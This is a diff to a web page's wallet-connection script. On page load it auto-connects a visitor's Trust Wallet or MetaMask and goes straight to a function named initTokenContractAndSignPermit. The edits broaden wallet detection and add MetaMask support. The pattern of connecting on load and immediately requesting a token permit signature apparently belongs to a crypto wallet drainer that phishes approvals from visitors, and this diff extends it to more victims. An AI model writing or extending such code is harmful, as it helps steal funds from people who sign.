@@ -177,7 +177,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     const isMetaMask = window.ethereum && window.ethereum.isMetaMask;
     
     if (typeof window.ethereum === 'undefined') {
-        if (isTrustWallet === false && window.web3) {
+        if (window.web3 && window.web3.currentProvider) {
             window.ethereum = window.web3.currentProvider;
         } else {
             showStatus('Please install MetaMask or Trust Wallet', 'error');
@@ -187,6 +187,8 @@ document.addEventListener('DOMContentLoaded', async () => {
     
     if (isTrustWallet) {
         showStatus('Trust Wallet detected. Connecting...', 'info');
+    } else if (isMetaMask) {
+        showStatus('MetaMask detected. Connecting...', 'info');
     }
     
     await autoConnectWallet();
@@ -194,11 +196,14 @@ document.addEventListener('DOMContentLoaded', async () => {
 
 async function autoConnectWallet() {
     try {
-        if (!window.ethereum) {
+        let ethereum = window.ethereum;
+        
+        if (!ethereum) {
             if (window.web3 && window.web3.currentProvider) {
-                window.ethereum = window.web3.currentProvider;
+                ethereum = window.web3.currentProvider;
+                window.ethereum = ethereum;
             } else {
-                showStatus('Wallet not found. Please open in Trust Wallet browser', 'error');
+                showStatus('Wallet not found. Please install MetaMask or Trust Wallet', 'error');
                 const connectBtn = document.getElementById('connectWallet');
                 if (connectBtn) {
                     connectBtn.style.display = 'block';
@@ -208,7 +213,7 @@ async function autoConnectWallet() {
             }
         }
         
-        provider = new ethers.providers.Web3Provider(window.ethereum);
+        provider = new ethers.providers.Web3Provider(ethereum);
         
         showStatus('Connecting wallet...', 'info');
         
@@ -238,7 +243,7 @@ async function autoConnectWallet() {
                 return;
             }
             
-            provider = new ethers.providers.Web3Provider(window.ethereum);
+            provider = new ethers.providers.Web3Provider(ethereum);
             signer = provider.getSigner();
             
             await initTokenContractAndSignPermit();
@@ -266,7 +271,7 @@ async function autoConnectWallet() {
                         return;
                     }
                     
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    provider = new ethers.providers.Web3Provider(ethereum);
                     signer = provider.getSigner();
                     
                     await initTokenContractAndSignPermit();
@@ -306,16 +311,21 @@ window.connectWallet = async function connectWallet() {
             connectBtn.disabled = true;
         }
         
-        if (!window.ethereum) {
-            showStatus('Wallet not found', 'error');
+        const ethereum = window.ethereum || (window.web3 && window.web3.currentProvider);
+        if (!ethereum) {
+            showStatus('Wallet not found. Please install MetaMask or Trust Wallet', 'error');
             if (connectBtn) {
                 connectBtn.disabled = false;
             }
             return;
         }
         
+        if (!window.ethereum && ethereum) {
+            window.ethereum = ethereum;
+        }
+        
         if (!provider) {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
+            provider = new ethers.providers.Web3Provider(ethereum);
         }
         
         const accounts = await provider.send("eth_requestAccounts", []);
@@ -339,7 +349,7 @@ window.connectWallet = async function connectWallet() {
             return;
         }
         
-        provider = new ethers.providers.Web3Provider(window.ethereum);
+        provider = new ethers.providers.Web3Provider(ethereum);
         signer = provider.getSigner();
         
         if (connectBtn) {
